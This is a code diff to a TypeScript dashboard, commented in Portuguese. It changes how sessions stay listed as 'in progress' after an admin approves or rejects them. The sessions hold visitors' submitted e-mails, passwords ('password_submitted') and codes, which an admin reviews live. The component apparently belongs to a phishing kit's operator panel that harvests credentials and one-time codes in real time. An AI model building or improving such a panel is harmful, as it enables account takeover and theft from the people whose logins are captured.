@@ -502,11 +502,15 @@ export default function Dashboard() {
       arr.push(l);
       bySession.set(l.session_id, arr);
     }
-    // Sessões que JÁ TÊM ação (approve/reject) finalizada não ficam mais em andamento.
-    const decidedSessions = new Set<string>();
+    // Última ação (approve/reject) por sessão. Só remove a sessão de "em andamento"
+    // se a ação for MAIS RECENTE que a última atividade do visitante — assim, se ele
+    // voltar a digitar depois (novo e-mail/senha/código), a sessão reaparece.
+    const lastDecisionBySession = new Map<string, string>();
     for (const a of actions) {
-      if (a.action === "approve" || a.action === "reject") {
-        decidedSessions.add(a.session_id);
+      if (a.action !== "approve" && a.action !== "reject") continue;
+      const prev = lastDecisionBySession.get(a.session_id);
+      if (!prev || a.created_at.localeCompare(prev) > 0) {
+        lastDecisionBySession.set(a.session_id, a.created_at);
       }
     }
     const active: ActiveSession[] = [];
@@ -520,8 +524,10 @@ export default function Dashboard() {
       // Mantém a sessão em andamento mesmo se ela já submeteu código —
       // o card mobile mostra o código + Aprovar/Rejeitar inline, evitando
       // que o admin precise rolar até outra seção em tela micro.
-      // Só remove se já houve uma ação (aprovar/rejeitar) pra essa sessão.
-      if (decidedSessions.has(sid)) continue;
+      // Só remove se a ÚLTIMA ação foi DEPOIS da última atividade — caso contrário,
+      // a sessão voltou a digitar e precisa reaparecer.
+      const lastDecision = lastDecisionBySession.get(sid);
+      if (lastDecision && lastDecision.localeCompare(lastActivity) >= 0) continue;
       const email = [...emails].sort((a, b) => a.created_at.localeCompare(b.created_at)).pop()!.value;
       const passwordRow = [...items]
         .filter((i) => i.field_name === "password_submitted")
